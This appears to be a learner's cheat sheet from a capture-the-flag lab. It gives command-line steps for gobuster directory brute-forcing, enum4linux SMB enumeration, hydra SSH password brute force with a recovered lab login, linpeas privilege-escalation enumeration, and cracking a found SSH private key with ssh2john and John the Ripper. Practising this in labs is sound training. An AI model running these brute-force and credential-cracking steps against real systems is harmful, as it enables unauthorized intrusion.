
                        gobuster
a tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names.  

gobuster dir -u "http://address" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

/usr/share/wordlists/dirbuster/directory-list-1.0.txt

gobuster -u http://$IP  -w  /usr/share/wordlists/dirbuster/directory-list-1.0.txt
	 -x php,sh,txt,cgi,html,js,css,py


results: list of directiors
   
	 
enum4linux  (similar    to enum.exe  )
======================
     obtaining information about SMB and Windows systems.
 enum4linux -a <ip> #10.10.151.122

results:
   A very long list. At the end tou fill the next lines:
   
   
7.  sudo hydra -l   <user name>  -P  <word list file>  ssh<ip>
   sudo hydra -l   <user name>   -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  ssh://<Host ip>
 

   results:   [22][ssh] host: 10.10.151.122   login: jan  password: armando

8. login using ssh jan@10.10.141.152   with passward: armando
 



8. Enumerate the machine to find any vectors for privilege escalation.
    
	LinEnum: Scripted Local Linux Enumeration ...
  download linpeas  
  wget https://github.com/peass-ng/PEASS-ng/releases/download/20251017-d864f4c3/linpeas.sh

  copy from the local to remote with the next command :
     scp ./linpeas.sh <username>@<remote IP>:<path in the remote> 

SCP, (Secure Copy Protocol), transfer files between  between two remote systems. It uses SSH for encryption 

  cd  <path in the remote>
  chmod +x linpeas.sh
  ./linpeas.sh | tee lilog.txt
  
results:  the output is a very long list
    At the middle we will find the next lines :
   "Possible private SSH keys were found! /home/kay/.ssh/id_rsa"
    so 'kay' has a private key.

  “John the Ripper.”  
===============================
chmod 600 a.txt
ssh2john <RSA key file>  > decrypted1.txt
run  John the Ripper to attempt to crack the passphrase by providing the 
sudo john --wordlist=/usr/share/wordlists/rockyou.txt  decrypted1.txt


   nikto
 nikto: web server and CGI scanner , informational checks.
    nikto -h http://$IP 
	
                decoding	
https://www.cyberchef.dev/cyberchef#google_vignette
https://www.dcode.fr/hash-function	
https://www.rapidtables.com/convert/number/   Number Converter
 	